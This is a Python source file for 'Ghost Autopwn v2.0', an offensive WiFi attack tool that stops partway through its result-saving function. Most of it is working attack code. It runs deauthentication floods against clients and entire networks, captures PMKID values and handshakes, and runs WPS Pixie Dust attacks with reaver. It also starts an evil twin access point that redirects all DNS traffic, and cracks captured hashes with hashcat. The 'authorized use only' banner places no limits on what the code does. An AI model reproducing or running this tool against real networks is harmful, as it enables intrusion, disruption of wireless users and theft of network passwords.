#!/usr/bin/env python3
"""
👻 GHOST AUTOPWN v2.0 - Complete Rebuild
==========================================
WiFi Security Auditing Suite with Advanced Features

AUTHORIZED USE ONLY - Educational & Pentesting
"""

import os
import sys
import time
import subprocess
import re
import signal
import argparse
from datetime import datetime
from pathlib import Path
from collections import defaultdict
import glob

# Import advanced modules
try:
    from wordlist_generator import WordlistGenerator
    WORDLIST_AVAILABLE = True
except:
    WORDLIST_AVAILABLE = False

try:
    from advanced_attacks import AdvancedAttacks
    ADVANCED_AVAILABLE = True
except:
    ADVANCED_AVAILABLE = False

try:
    from intelligence import WiFiIntelligence
    INTELLIGENCE_AVAILABLE = True
except:
    INTELLIGENCE_AVAILABLE = False

try:
    from monitoring import WiFiMonitor
    MONITORING_AVAILABLE = True
except:
    MONITORING_AVAILABLE = False

try:
    from evasion import EvasionTechniques
    EVASION_AVAILABLE = True
except:
    EVASION_AVAILABLE = False


# Ghost Theme Colors
class C:
    """Colors - Ghost Theme"""
    # Basic
    R = '\033[0m'      # Reset
    B = '\033[1m'      # Bold

    # Ghost colors
    GH = '\033[38;5;147m'   # Ghost purple
    PH = '\033[38;5;213m'   # Phantom pink
    SP = '\033[38;5;93m'    # Spooky dark purple
    NE = '\033[38;5;51m'    # Neon cyan
    TX = '\033[38;5;46m'    # Toxic green
    BL = '\033[38;5;196m'   # Blood red
    GO = '\033[38;5;220m'   # Gold
    CY = '\033[38;5;81m'    # Cyber blue


def ghost_print(msg, color=C.GH, icon="👻"):
    """Print with ghost theme"""
    print(f"{color}{icon} {msg}{C.R}")


def banner():
    """Display banner"""
    b = f"""{C.PH}{C.B}
    ╔══════════════════════════════════════════════════╗
    ║       👻 GHOST AUTOPWN v2.0 - REBUILT 👻        ║
    ║    Advanced WiFi Security Auditing Suite         ║
    ╚══════════════════════════════════════════════════╝{C.R}

{C.TX}    ⚡ Evil Twin    🌀 Karma       🧠 AI Targeting
    📡 PMKID/WPA    🔓 WPS Attacks  🕵️  Stealth Mode{C.R}

{C.BL}{C.B}    ⚠️  AUTHORIZED USE ONLY - Educational/Pentesting ⚠️{C.R}

{C.GO}{'═'*58}{C.R}
"""
    print(b)


class GhostWiFi:
    """Main WiFi Attack Suite - Completely Rebuilt"""

    def __init__(self, verbose=False):
        self.verbose = verbose
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.clients = defaultdict(list)
        self.capture_dir = Path.home() / "wifi_captures"
        self.capture_dir.mkdir(exist_ok=True, parents=True)

        # Advanced modules
        self.advanced = None
        self.intel = None
        self.monitor = None
        self.evasion = None

        # Process tracking
        self.processes = []

        # Stats
        self.stats = {
            'networks_found': 0,
            'clients_found': 0,
            'attacks_launched': 0,
            'passwords_cracked': 0
        }

        # Handle Ctrl+C
        signal.signal(signal.SIGINT, self.cleanup_handler)

    def cleanup_handler(self, sig, frame):
        """Handle Ctrl+C"""
        print(f"\n{C.BL}💀 Shutting down...{C.R}")
        self.cleanup()
        sys.exit(0)

    def log(self, msg, level="INFO"):
        """Logging with ghost theme"""
        ts = datetime.now().strftime("%H:%M:%S")

        icons = {
            "INFO": "👻",
            "SUCCESS": "✨",
            "ERROR": "💀",
            "WARNING": "⚠️",
            "ATTACK": "🔥",
            "SCAN": "📡"
        }

        colors = {
            "INFO": C.NE,
            "SUCCESS": C.TX,
            "ERROR": C.BL,
            "WARNING": C.GO,
            "ATTACK": C.PH,
            "SCAN": C.CY
        }

        icon = icons.get(level, "💬")
        color = colors.get(level, C.GH)

        print(f"{color}[{ts}] {icon} {msg}{C.R}")

    def debug(self, msg):
        """Debug output"""
        if self.verbose:
            print(f"{C.GH}[DEBUG] {msg}{C.R}")

    def run(self, cmd, shell=False, timeout=60, show=False):
        """Run command with proper error handling"""
        self.debug(f"Running: {cmd if isinstance(cmd, str) else ' '.join(cmd)}")

        try:
            if show or self.verbose:
                result = subprocess.run(cmd, shell=shell, timeout=timeout, capture_output=False, text=True)
            else:
                result = subprocess.run(cmd, shell=shell, timeout=timeout, capture_output=True, text=True)

            return result
        except subprocess.TimeoutExpired:
            self.log("Command timed out", "WARNING")
            return None
        except Exception as e:
            self.log(f"Command failed: {e}", "ERROR")
            return None

    def check_root(self):
        """Check root"""
        if os.geteuid() != 0:
            self.log("Root required! Run with sudo", "ERROR")
            return False
        return True

    def install_tools(self):
        """Auto-install missing tools"""
        print(f"\n{C.PH}{'═'*60}")
        print(f"📦 AUTO-INSTALLER")
        print(f"{'═'*60}{C.R}\n")

        packages = {
            'aircrack-ng': ['airmon-ng', 'airodump-ng', 'aireplay-ng'],
            'hashcat': ['hashcat'],
            'reaver': ['reaver', 'wash'],
            'hcxtools': ['hcxdumptool', 'hcxpcapngtool'],
            'hostapd': ['hostapd'],
            'dnsmasq': ['dnsmasq'],
            'wireless-tools': ['iwconfig'],
            'iw': ['iw'],
            'macchanger': ['macchanger']
        }

        to_install = []

        for package, commands in packages.items():
            for cmd in commands:
                if subprocess.run(['which', cmd], capture_output=True).returncode != 0:
                    if package not in to_install:
                        to_install.append(package)
                    break

        if not to_install:
            self.log("All tools already installed!", "SUCCESS")
            return True

        print(f"{C.GO}Missing packages:{C.R}")
        for pkg in to_install:
            print(f"  • {pkg}")
        print()

        install = input(f"{C.NE}Install now? (y/n): {C.R}").strip()

        if install.lower() == 'y':
            self.log("Installing packages...", "INFO")

            # Update
            self.log("Updating package lists...", "INFO")
            self.run(['apt', 'update'], show=True)

            # Install
            for pkg in to_install:
                self.log(f"Installing {pkg}...", "INFO")
                result = self.run(['apt', 'install', '-y', pkg], show=True)

                if result and result.returncode == 0:
                    self.log(f"{pkg} installed", "SUCCESS")
                else:
                    self.log(f"{pkg} install failed", "ERROR")

            self.log("Installation complete!", "SUCCESS")
            return True

        return False

    def check_deps(self):
        """Check dependencies"""
        self.log("Checking dependencies...", "INFO")

        required = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
        optional = ['hashcat', 'reaver', 'wash', 'hostapd', 'dnsmasq', 'hcxdumptool']

        missing_req = []
        missing_opt = []

        for cmd in required:
            if subprocess.run(['which', cmd], capture_output=True).returncode != 0:
                missing_req.append(cmd)

        for cmd in optional:
            if subprocess.run(['which', cmd], capture_output=True).returncode != 0:
                missing_opt.append(cmd)

        if missing_req:
            self.log(f"Missing required: {', '.join(missing_req)}", "ERROR")

            install = input(f"\n{C.GO}Auto-install missing tools? (y/n): {C.R}").strip()

            if install.lower() == 'y':
                return self.install_tools()
            else:
                print(f"\n{C.BL}Manual install: sudo apt install aircrack-ng{C.R}\n")
                return False

        if missing_opt:
            self.log(f"Missing optional: {', '.join(missing_opt)}", "WARNING")

            install = input(f"\n{C.GO}Install optional tools for more features? (y/n): {C.R}").strip()

            if install.lower() == 'y':
                self.install_tools()

        self.log("Core dependencies OK", "SUCCESS")
        return True

    def get_interfaces(self):
        """Get wireless interfaces"""
        self.debug("Scanning for wireless interfaces...")

        interfaces = []

        # Method 1: iwconfig
        result = self.run(['iwconfig'], show=False)
        if result and result.stdout:
            for line in result.stdout.split('\n'):
                if not line.startswith(' ') and line:
                    parts = line.split()
                    if parts and ('IEEE' in line or 'ESSID' in line or 'Mode' in line):
                        iface = parts[0]
                        if iface not in interfaces:
                            interfaces.append(iface)

        # Method 2: iw dev
        result = self.run(['iw', 'dev'], show=False)
        if result and result.stdout:
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        iface = parts[1]
                        if iface not in interfaces:
                            interfaces.append(iface)

        # Method 3: Check /sys/class/net
        net_path = Path('/sys/class/net')
        if net_path.exists():
            for iface_path in net_path.iterdir():
                iface = iface_path.name
                if 'wlan' in iface or 'wlp' in iface:
                    if iface not in interfaces:
                        interfaces.append(iface)

        self.debug(f"Found interfaces: {interfaces}")
        return interfaces

    def select_interface(self):
        """Interface selection"""
        interfaces = self.get_interfaces()

        if not interfaces:
            self.log("No wireless interfaces found!", "ERROR")
            self.log("Check if WiFi adapter is connected", "WARNING")
            return False

        print(f"\n{C.PH}{'═'*60}")
        print(f"📡 WIRELESS INTERFACES")
        print(f"{'═'*60}{C.R}\n")

        for i, iface in enumerate(interfaces, 1):
            # Check mode
            mode = "Unknown"
            result = self.run(['iwconfig', iface], show=False)
            if result and result.stdout:
                if 'Mode:Monitor' in result.stdout:
                    mode = f"{C.TX}Monitor{C.R}"
                elif 'Mode:Managed' in result.stdout:
                    mode = f"{C.NE}Managed{C.R}"

            print(f"  [{C.TX}{i}{C.R}] {iface:<15} Mode: {mode}")

        print()

        while True:
            try:
                choice = input(f"{C.NE}Select interface [1-{len(interfaces)}]: {C.R}").strip()
                idx = int(choice) - 1

                if 0 <= idx < len(interfaces):
                    self.interface = interfaces[idx]
                    self.log(f"Selected: {self.interface}", "SUCCESS")
                    return True
                else:
                    print(f"{C.BL}Invalid choice{C.R}")

            except (ValueError, KeyboardInterrupt):
                print()
                return False

    def enable_monitor(self):
        """Enable monitor mode - FIXED"""
        self.log(f"Enabling monitor mode on {self.interface}...", "INFO")

        # Check if already in monitor
        result = self.run(['iwconfig', self.interface], show=False)
        if result and result.stdout and 'Mode:Monitor' in result.stdout:
            self.log("Already in monitor mode", "SUCCESS")
            self.monitor_interface = self.interface
            return True

        # Kill interfering processes
        self.debug("Killing interfering processes...")
        self.run(['airmon-ng', 'check', 'kill'], show=self.verbose)

        time.sleep(1)

        # Start monitor mode
        self.log("Starting monitor mode...", "INFO")
        result = self.run(['airmon-ng', 'start', self.interface], show=self.verbose)

        time.sleep(3)

        # Find monitor interface
        possible = [
            self.interface + 'mon',
            self.interface,
            'wlan0mon',
            'wlan1mon',
            'wlp2s0mon',
            'wlp3s0mon'
        ]

        for name in possible:
            check = self.run(['iwconfig', name], show=False)
            if check and check.returncode == 0 and check.stdout and 'Mode:Monitor' in check.stdout:
                self.monitor_interface = name
                self.log(f"Monitor mode enabled: {self.monitor_interface}", "SUCCESS")
                return True

        # If still not found, list all interfaces and check
        all_ifaces = self.get_interfaces()
        for iface in all_ifaces:
            check = self.run(['iwconfig', iface], show=False)
            if check and check.stdout and 'Mode:Monitor' in check.stdout:
                self.monitor_interface = iface
                self.log(f"Monitor mode enabled: {self.monitor_interface}", "SUCCESS")
                return True

        self.log("Failed to enable monitor mode", "ERROR")
        self.log(f"Try manually: sudo airmon-ng start {self.interface}", "WARNING")
        return False

    def scan_networks(self, duration=20):
        """FIXED Network Scanner with Debug Output"""
        if not self.monitor_interface:
            self.log("Monitor mode not enabled!", "ERROR")
            return False

        print(f"\n{C.CY}{'═'*60}")
        print(f"📡 NETWORK SCANNER - ENHANCED")
        print(f"{'═'*60}{C.R}\n")

        self.log(f"Scanning on {self.monitor_interface} for {duration}s...", "SCAN")
        print(f"{C.GO}💡 Watch for networks appearing below...{C.R}")
        print(f"{C.GO}💡 Press Ctrl+C when you see your target{C.R}\n")

        # Unique scan file
        timestamp = int(time.time())
        scan_file = self.capture_dir / f"scan_{timestamp}"

        self.debug(f"Scan file: {scan_file}")

        # Start airodump-ng with VISIBLE output
        cmd = [
            'airodump-ng',
            '--write', str(scan_file),
            '--output-format', 'csv',
            self.monitor_interface
        ]

        self.debug(f"Command: {' '.join(cmd)}")

        try:
            # Run with VISIBLE output so user sees networks
            proc = subprocess.Popen(cmd)
            self.processes.append(proc)

            # Wait
            time.sleep(duration)

            # Stop
            proc.terminate()
            proc.wait(timeout=5)
            self.processes.remove(proc)

        except KeyboardInterrupt:
            print(f"\n{C.GO}⏸️  Scan interrupted{C.R}\n")
            if proc in self.processes:
                proc.terminate()
                proc.wait(timeout=5)
                self.processes.remove(proc)

        except Exception as e:
            self.log(f"Scan error: {e}", "ERROR")
            return False

        # Find CSV file - CHECK ALL POSSIBLE NAMES
        csv_files = list(self.capture_dir.glob(f"scan_{timestamp}*.csv"))

        self.debug(f"Looking for CSV files matching: scan_{timestamp}*.csv")
        self.debug(f"Found files: {csv_files}")

        if not csv_files:
            # Try without timestamp
            csv_files = list(self.capture_dir.glob("scan_*.csv"))
            self.debug(f"Trying broader search: {csv_files}")

        if csv_files:
            # Use most recent
            csv_file = max(csv_files, key=lambda p: p.stat().st_mtime)
            self.log(f"Found scan file: {csv_file.name}", "SUCCESS")

            # Parse it
            success = self.parse_csv(csv_file)

            # Cleanup scan files
            for f in csv_files:
                try:
                    f.unlink()
                except:
                    pass

            # Also cleanup .cap and other files
            for ext in ['.cap', '.kismet.csv', '.kismet.netxml']:
                for f in self.capture_dir.glob(f"scan_{timestamp}*{ext}"):
                    try:
                        f.unlink()
                    except:
                        pass

            return success
        else:
            self.log("No scan results found!", "ERROR")
            self.log(f"Check {self.capture_dir} for files", "WARNING")

            # List what files ARE there
            all_files = list(self.capture_dir.glob("*"))
            if all_files:
                self.debug(f"Files in capture dir: {[f.name for f in all_files[:10]]}")

            return False

    def parse_csv(self, csv_path):
        """FIXED CSV Parser with Debug"""
        self.log(f"Parsing {csv_path.name}...", "INFO")

        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            if not content.strip():
                self.log("CSV file is empty!", "ERROR")
                return False

            self.debug(f"CSV size: {len(content)} bytes")

            # Reset
            self.networks = []
            self.clients = defaultdict(list)

            # Split by double newline (sections)
            sections = content.split('\n\n')

            if len(sections) < 1:
                self.log("No sections in CSV", "ERROR")
                return False

            # Parse APs
            ap_section = sections[0]
            lines = ap_section.split('\n')

            header_found = False
            ap_count = 0

            for line in lines:
                # Find header
                if 'BSSID' in line and not header_found:
                    header_found = True
                    self.debug("Found AP header")
                    continue

                # Parse data rows
                if header_found and line.strip():
                    parts = [p.strip() for p in line.split(',')]

                    if len(parts) >= 14:
                        bssid = parts[0]
                        essid = parts[13] if len(parts) > 13 else ''

                        # Skip if BSSID is the header word
                        if bssid == 'BSSID' or not bssid:
                            continue

                        # Must have BSSID
                        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                            continue

                        ap_count += 1

                        self.networks.append({
                            'bssid': bssid,
                            'essid': essid if essid else f"<Hidden-{bssid[:8]}>",
                            'channel': parts[3] if len(parts) > 3 else '?',
                            'encryption': parts[5] if len(parts) > 5 else '?',
                            'cipher': parts[6] if len(parts) > 6 else '',
                            'auth': parts[7] if len(parts) > 7 else '',
                            'power': parts[8] if len(parts) > 8 else '-100',
                            'beacons': parts[9] if len(parts) > 9 else '0',
                            'speed': parts[4] if len(parts) > 4 else '0',
                            'wps': False,
                            'wps_locked': False
                        })

            # Parse Clients
            if len(sections) > 1:
                client_section = sections[1]
                lines = client_section.split('\n')

                header_found = False
                client_count = 0

                for line in lines:
                    if 'Station MAC' in line and not header_found:
                        header_found = True
                        self.debug("Found client header")
                        continue

                    if header_found and line.strip():
                        parts = [p.strip() for p in line.split(',')]

                        if len(parts) >= 6:
                            client_mac = parts[0]
                            bssid = parts[5]

                            if client_mac and bssid and bssid != '(not associated)':
                                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', client_mac):
                                    client_count += 1

                                    self.clients[bssid].append({
                                        'mac': client_mac,
                                        'power': parts[3] if len(parts) > 3 else '?',
                                        'packets': parts[4] if len(parts) > 4 else '0'
                                    })

            # Update stats
            self.stats['networks_found'] = len(self.networks)
            self.stats['clients_found'] = sum(len(clients) for clients in self.clients.values())

            self.log(f"Found {ap_count} APs, {self.stats['clients_found']} clients", "SUCCESS")

            return len(self.networks) > 0

        except Exception as e:
            self.log(f"Parse error: {e}", "ERROR")
            if self.verbose:
                import traceback
                traceback.print_exc()
            return False

    def display_networks(self):
        """Display networks - BETTER FORMAT"""
        if not self.networks:
            self.log("No networks to display", "WARNING")
            return False

        print(f"\n{C.TX}{C.B}{'═'*120}")
        print(f"{'📡 DISCOVERED NETWORKS':^120}")
        print(f"{'═'*120}{C.R}\n")

        # Header
        print(f"{C.CY}{'#':<4} {'ESSID':<30} {'BSSID':<19} {'CH':<4} {'PWR':<6} {'ENC':<18} {'CLIENTS':<8}{C.R}")
        print(f"{C.GH}{'─'*120}{C.R}")

        # Sort by power (strongest first)
        sorted_nets = sorted(self.networks, key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -999, reverse=True)

        for i, net in enumerate(sorted_nets, 1):
            clients = len(self.clients.get(net['bssid'], []))

            # Color by signal
            power = int(net['power']) if net['power'].lstrip('-').isdigit() else -100
            if power > -50:
                pwr_color = C.TX
            elif power > -70:
                pwr_color = C.GO
            else:
                pwr_color = C.GH

            # Color by encryption
            if 'WPA' in net['encryption']:
                enc_color = C.NE
            elif 'WEP' in net['encryption']:
                enc_color = C.BL
            else:
                enc_color = C.GH

            essid = net['essid'][:29]

            print(f"{C.TX}{i:<4}{C.R} {essid:<30} {net['bssid']:<19} {net['channel']:<4} "
                  f"{pwr_color}{net['power']:<6}{C.R} {enc_color}{net['encryption']:<18}{C.R} "
                  f"{C.PH}{clients:<8}{C.R}")

        print()
        return True

    def select_target(self):
        """Select target"""
        if not self.display_networks():
            return None

        while True:
            try:
                choice = input(f"{C.NE}Select target [1-{len(self.networks)}] or 'r' to rescan: {C.R}").strip()

                if choice.lower() == 'r':
                    return 'rescan'

                idx = int(choice) - 1

                if 0 <= idx < len(self.networks):
                    # Get sorted list (same as display)
                    sorted_nets = sorted(self.networks, key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -999, reverse=True)
                    target = sorted_nets[idx]

                    self.log(f"Selected: {target['essid']} ({target['bssid']})", "SUCCESS")
                    return target
                else:
                    print(f"{C.BL}Invalid choice{C.R}")

            except (ValueError, KeyboardInterrupt):
                print()
                return None

    def attack_pmkid(self, target):
        """PMKID Attack - No clients needed"""
        print(f"\n{C.CY}{'═'*60}")
        print(f"🎯 PMKID ATTACK")
        print(f"{'═'*60}{C.R}\n")

        # Check for hcxdumptool
        if subprocess.run(['which', 'hcxdumptool'], capture_output=True).returncode != 0:
            self.log("hcxdumptool not found", "ERROR")
            print(f"{C.GO}Install: sudo apt install hcxtools{C.R}\n")
            return None

        bssid = target['bssid']
        channel = target['channel']
        essid = target['essid']

        timestamp = int(time.time())
        cap_file = self.capture_dir / f"pmkid_{essid}_{timestamp}.pcapng"

        self.log(f"Capturing PMKID from {essid}...", "ATTACK")
        print(f"  BSSID: {bssid}")
        print(f"  Channel: {channel}")
        print(f"  Duration: 60s\n")

        # Set channel
        self.run(['iwconfig', self.monitor_interface, 'channel', channel], show=False)

        # Run hcxdumptool
        cmd = [
            'hcxdumptool',
            '-i', self.monitor_interface,
            '-o', str(cap_file),
            '--enable_status=1',
            '--filterlist_ap=' + bssid,
            '--filtermode=2'
        ]

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL if not self.verbose else None)
            self.processes.append(proc)

            time.sleep(60)

            proc.terminate()
            proc.wait(timeout=5)
            self.processes.remove(proc)

        except KeyboardInterrupt:
            print(f"\n{C.GO}Stopped{C.R}\n")
            if proc in self.processes:
                proc.terminate()
                proc.wait(timeout=5)
                self.processes.remove(proc)

        # Convert to hashcat format
        if cap_file.exists():
            hash_file = cap_file.with_suffix('.hash')

            result = self.run(['hcxpcapngtool', '-o', str(hash_file), str(cap_file)], show=False)

            if hash_file.exists() and hash_file.stat().st_size > 0:
                self.log("PMKID captured successfully!", "SUCCESS")
                self.stats['attacks_launched'] += 1
                return str(hash_file)
            else:
                self.log("No PMKID found", "WARNING")

        return None

    def attack_handshake(self, target):
        """Handshake Capture with Deauth"""
        print(f"\n{C.CY}{'═'*60}")
        print(f"🤝 HANDSHAKE CAPTURE")
        print(f"{'═'*60}{C.R}\n")

        essid = target['essid']
        bssid = target['bssid']
        channel = target['channel']
        clients = self.clients.get(bssid, [])

        timestamp = int(time.time())
        cap_file = self.capture_dir / f"handshake_{essid}_{timestamp}"

        self.log(f"Capturing handshake from {essid}...", "ATTACK")
        print(f"  BSSID: {bssid}")
        print(f"  Channel: {channel}")
        print(f"  Clients: {len(clients)}\n")

        if not clients:
            self.log("No clients detected - waiting for connections...", "WARNING")

        # Start airodump-ng
        cmd = [
            'airodump-ng',
            '--bssid', bssid,
            '--channel', channel,
            '--write', str(cap_file),
            '--output-format', 'pcap',
            self.monitor_interface
        ]

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL if not self.verbose else None)
            self.processes.append(proc)

            time.sleep(3)

            # Deauth attacks
            if clients:
                self.log(f"Deauthing {len(clients)} clients...", "ATTACK")

                for client in clients:
                    deauth_cmd = [
                        'aireplay-ng',
                        '--deauth', '5',
                        '-a', bssid,
                        '-c', client['mac'],
                        self.monitor_interface
                    ]

                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(1)
            else:
                # Broadcast deauth
                self.log("Sending broadcast deauth...", "ATTACK")

                for i in range(3):
                    deauth_cmd = [
                        'aireplay-ng',
                        '--deauth', '10',
                        '-a', bssid,
                        self.monitor_interface
                    ]

                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(5)

            # Wait for handshake
            self.log("Waiting for handshake (60s)...", "INFO")

            for i in range(12):
                time.sleep(5)

                # Check for handshake
                cap_files = list(self.capture_dir.glob(f"{cap_file.name}*.cap"))

                if cap_files:
                    result = subprocess.run(
                        ['aircrack-ng', str(cap_files[0])],
                        capture_output=True,
                        text=True
                    )

                    if result and result.stdout and 'handshake' in result.stdout.lower():
                        self.log("Handshake captured!", "SUCCESS")
                        proc.terminate()
                        proc.wait(timeout=5)
                        self.processes.remove(proc)
                        self.stats['attacks_launched'] += 1
                        return str(cap_files[0])

                if self.verbose and i % 3 == 0:
                    remaining = 60 - (i * 5)
                    print(f"  {remaining}s remaining...")

            proc.terminate()
            proc.wait(timeout=5)
            self.processes.remove(proc)

            self.log("No handshake captured", "WARNING")

        except KeyboardInterrupt:
            print(f"\n{C.GO}Stopped{C.R}\n")
            if proc in self.processes:
                proc.terminate()
                proc.wait(timeout=5)
                self.processes.remove(proc)

        return None

    def attack_wps(self, target):
        """WPS Pixie Dust Attack"""
        print(f"\n{C.CY}{'═'*60}")
        print(f"🔓 WPS PIXIE DUST ATTACK")
        print(f"{'═'*60}{C.R}\n")

        # Check for reaver
        if subprocess.run(['which', 'reaver'], capture_output=True).returncode != 0:
            self.log("reaver not found", "ERROR")
            print(f"{C.GO}Install: sudo apt install reaver{C.R}\n")
            return None

        bssid = target['bssid']
        channel = target['channel']
        essid = target['essid']

        self.log(f"Attacking {essid} with Pixie Dust...", "ATTACK")
        print(f"  BSSID: {bssid}")
        print(f"  Channel: {channel}\n")

        cmd = [
            'reaver',
            '-i', self.monitor_interface,
            '-b', bssid,
            '-c', channel,
            '-K', '1',  # Pixie Dust
            '-vv'
        ]

        result = self.run(cmd, show=True, timeout=300)

        if result and result.stdout:
            # Check for PIN/PSK
            pin_match = re.search(r'WPS PIN: [\'"]?(\d{8})[\'"]?', result.stdout)
            psk_match = re.search(r'WPA PSK: [\'"]?(.+?)[\'"]?$', result.stdout, re.MULTILINE)

            if pin_match:
                pin = pin_match.group(1)
                self.log(f"WPS PIN: {pin}", "SUCCESS")

                if psk_match:
                    password = psk_match.group(1).strip()
                    self.log(f"PASSWORD: {password}", "SUCCESS")
                    self.stats['passwords_cracked'] += 1

                    return {'type': 'wps', 'pin': pin, 'password': password}

        self.log("WPS attack failed", "WARNING")
        return None

    def attack_evil_twin(self, target):
        """Evil Twin Attack with Captive Portal"""
        print(f"\n{C.CY}{'═'*60}")
        print(f"👤 EVIL TWIN ATTACK")
        print(f"{'═'*60}{C.R}\n")

        # Check dependencies
        for tool in ['hostapd', 'dnsmasq']:
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                self.log(f"{tool} not found", "ERROR")
                print(f"{C.GO}Install: sudo apt install hostapd dnsmasq{C.R}\n")
                return None

        essid = target['essid']
        channel = target['channel']

        self.log(f"Creating Evil Twin: {essid}", "ATTACK")
        print(f"  Channel: {channel}")
        print(f"  Captive portal will capture credentials\n")

        # Create configs
        config_dir = self.capture_dir / 'evil_twin'
        config_dir.mkdir(exist_ok=True, parents=True)

        hostapd_conf = config_dir / 'hostapd.conf'
        with open(hostapd_conf, 'w') as f:
            f.write(f"""interface={self.monitor_interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
""")

        dnsmasq_conf = config_dir / 'dnsmasq.conf'
        with open(dnsmasq_conf, 'w') as f:
            f.write(f"""interface={self.monitor_interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
""")

        try:
            # Configure interface
            self.run(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.monitor_interface], show=False)
            self.run(['ip', 'link', 'set', self.monitor_interface, 'up'], show=False)

            # Start hostapd
            self.log("Starting rogue AP...", "ATTACK")
            hostapd_proc = subprocess.Popen(
                ['hostapd', str(hostapd_conf)],
                stdout=subprocess.DEVNULL if not self.verbose else None
            )
            self.processes.append(hostapd_proc)

            time.sleep(3)

            # Start dnsmasq
            dnsmasq_proc = subprocess.Popen(
                ['dnsmasq', '-C', str(dnsmasq_conf), '--no-daemon'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(dnsmasq_proc)

            self.log(f"Evil Twin active: {essid}", "SUCCESS")
            self.log("Waiting for victims (Ctrl+C to stop)...", "INFO")

            # Wait for Ctrl+C
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n{C.GO}Stopping Evil Twin{C.R}\n")

        finally:
            # Cleanup
            for proc in [hostapd_proc, dnsmasq_proc]:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                    if proc in self.processes:
                        self.processes.remove(proc)
                except:
                    pass

            # Remove IP
            self.run(['ip', 'addr', 'del', '192.168.1.1/24', 'dev', self.monitor_interface], show=False)

        return None

    def crack_with_hashcat(self, hash_file, target):
        """Crack with hashcat"""
        print(f"\n{C.PH}{'═'*60}")
        print(f"💀 HASHCAT PASSWORD CRACKING")
        print(f"{'═'*60}{C.R}\n")

        if subprocess.run(['which', 'hashcat'], capture_output=True).returncode != 0:
            self.log("hashcat not found", "ERROR")
            print(f"{C.GO}Install: sudo apt install hashcat{C.R}\n")
            return None

        # Ask for wordlist
        print(f"{C.NE}Wordlist options:{C.R}")
        print(f"  [1] /usr/share/wordlists/rockyou.txt")
        print(f"  [2] Enter custom path")
        print(f"  [3] Generate custom wordlist\n")

        choice = input(f"{C.NE}Select [1-3]: {C.R}").strip()

        wordlist = None

        if choice == '1':
            wordlist = '/usr/share/wordlists/rockyou.txt'
            if wordlist.endswith('.gz'):
                self.log("Extracting rockyou.txt...", "INFO")
                subprocess.run(['gunzip', '-k', wordlist], stderr=subprocess.DEVNULL)
                wordlist = wordlist.replace('.gz', '')

        elif choice == '2':
            wordlist = input(f"{C.NE}Wordlist path: {C.R}").strip()

        elif choice == '3' and WORDLIST_AVAILABLE:
            self.log("Launching wordlist generator...", "INFO")
            from wordlist_generator import WordlistGenerator

            gen = WordlistGenerator()
            wordlist = gen.quick_generate({'essid': target['essid']})

        if not wordlist or not Path(wordlist).exists():
            self.log("No valid wordlist", "ERROR")
            return None

        # Determine hash mode
        hash_mode = '22000'  # WPA-PBKDF2-PMKID+EAPOL

        # Potfile
        potfile = self.capture_dir / 'hashcat.pot'

        cmd = [
            'hashcat',
            '-m', hash_mode,
            '-a', '0',
            '--potfile-path', str(potfile),
            '-w', '3',
            '--force',
            hash_file,
            wordlist
        ]

        self.log(f"Starting hashcat on {hash_file}...", "ATTACK")
        print(f"  Wordlist: {wordlist}")
        print(f"  Hash mode: {hash_mode}\n")

        try:
            subprocess.run(cmd)

            # Check potfile
            if potfile.exists():
                with open(potfile, 'r') as f:
                    for line in f:
                        if ':' in line:
                            password = line.split(':', 1)[1].strip()

                            print(f"\n{C.TX}{C.B}{'═'*60}")
                            print(f"✨ PASSWORD CRACKED! ✨")
                            print(f"{'═'*60}{C.R}\n")
                            print(f"{C.NE}Network:{C.R} {target['essid']}")
                            print(f"{C.TX}Password:{C.R} {C.B}{password}{C.R}\n")

                            self.stats['passwords_cracked'] += 1

                            return password

            self.log("Password not in wordlist", "WARNING")

        except KeyboardInterrupt:
            print(f"\n{C.GO}Stopped{C.R}\n")

        return None

    def convert_to_hashcat(self, cap_file, target):
        """Convert .cap to hashcat format"""
        self.log("Converting to hashcat format...", "INFO")

        # Check file
        cap_path = Path(cap_file)
        if not cap_path.exists():
            self.log("Capture file not found", "ERROR")
            return None

        # Output hash file
        hash_file = cap_path.with_suffix('.hc22000')

        # Check if hcxpcapngtool is available (newer)
        if subprocess.run(['which', 'hcxpcapngtool'], capture_output=True).returncode == 0:
            result = self.run(['hcxpcapngtool', '-o', str(hash_file), str(cap_path)], show=False)
        else:
            # Fallback to cap2hashcat if available
            result = self.run(['cap2hashcat', str(cap_path), str(hash_file)], show=False)

        if hash_file.exists() and hash_file.stat().st_size > 0:
            self.log(f"Converted to {hash_file.name}", "SUCCESS")
            return str(hash_file)
        else:
            self.log("Conversion failed", "ERROR")
            return None

    def save_result(self, target, attack_type, capture_file, password):
        """Save attack results with proper formatting"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Create results directory
        results_dir = self.capture_dir / 'results'
        results_dir.mkdir(exist_ok=True, parents=True)

        # Result filename
        essid_clean = re.sub(r'[^\w\-]', '_', target['essid'])
        result_file = results_dir / f"{essid_clean}_{attack_type}_{timestamp}.txt"

        # Write result
        with open(result_file, 'w') as f:
            f.write(f"{'='*60}\n")
            f.write(f"GHOST AUTOPWN - ATTACK RESULT\n")
            f.write(f"{'='*60}\n\n")

